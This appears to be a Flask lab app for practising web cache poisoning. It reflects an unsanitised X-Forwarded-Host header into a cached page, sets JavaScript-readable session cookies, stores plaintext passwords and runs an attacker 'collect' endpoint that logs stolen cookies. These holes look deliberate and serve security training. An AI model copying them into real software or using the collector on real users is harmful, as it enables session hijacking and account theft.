from flask import (
    Flask,
    request,
    session,
    redirect,
    make_response,
    render_template
)
from datetime import datetime

app = Flask(__name__)

# ⚠️ INSECURE CONFIGURATION FOR LAB PURPOSES
app.secret_key = 'insecure-secret-key'
app.config.update(
    SESSION_COOKIE_HTTPONLY=False,   # JS can read cookies (intentional)
    SESSION_COOKIE_SECURE=False,
    SESSION_COOKIE_SAMESITE="Lax"
)

# Mock user data
users = {
    'alice': 'alice',
    'bob': 'bob',
    'robel': 'robel'
}

# Storage for stolen cookies
stolen_data = []


# =====================
# HOME
# =====================
@app.route('/')
def home():
    return render_template('home.html')


# =====================
# LOGIN
# =====================
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        if username in users and users[username] == password:
            session['username'] = username
            return redirect('/profile')

        return "Invalid credentials", 401

    return render_template('login.html')


# =====================
# PRIVATE PROFILE
# =====================
@app.route('/profile')
def profile():
    if 'username' not in session:
        return redirect('/login')

    return render_template(
        'profile.html',
        username=session['username']
    )


# =====================
# PUBLIC PROFILE (VULNERABLE + CACHED)
# =====================
@app.route('/profile-public')
def profile_public():
    poison = request.headers.get('X-Forwarded-Host')

    # 🟢 CLEAN REQUEST (normal users, browser, first load)
    if not poison:
        response = make_response(
            render_template(
                'profile_public.html',
                region="Default-Zone"
            )
        )

        # 🚫 DO NOT cache clean response
        response.headers['Cache-Control'] = 'no-store'
        return response

    # 🔴 POISONED REQUEST (exploit only)
    response = make_response(
        render_template(
            'profile_public.html',
            region=poison  # intentionally unsafe
        )
    )

    # ✅ Allow Nginx to cache ONLY poisoned response
    response.headers['Cache-Control'] = 'public, max-age=3600'
    return response


# =====================
# COLLECTOR (ATTACKER)
# =====================
@app.route('/collect', methods=['GET', 'POST'])
def collect():
    global stolen_data

    # Accept cookie via GET, POST form, or JSON
    captured_cookie = (
        request.args.get('c')
        or request.form.get('c')
        or (request.json.get('c') if request.is_json else None)
    )

    # 🔴 FAST PATH: XSS exfiltration
    if captured_cookie:
        entry = {
            "cookie": captured_cookie,
            "time": datetime.utcnow().isoformat() + "Z",
            "ip": request.remote_addr,
            "ua": request.headers.get("User-Agent")
        }

        stolen_data.append(entry)
        print(f"[+] COOKIE CAPTURED: {entry}")

        resp = make_response('', 204)
        resp.headers['Cache-Control'] = 'no-store'
        return resp

    # 🟢 DASHBOARD
    resp = make_response(
        render_template(
            'collect.html',
            stolen_data=stolen_data
        )
    )
    resp.headers['Cache-Control'] = 'no-store'
    return resp


# =====================
# APP ENTRY
# =====================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
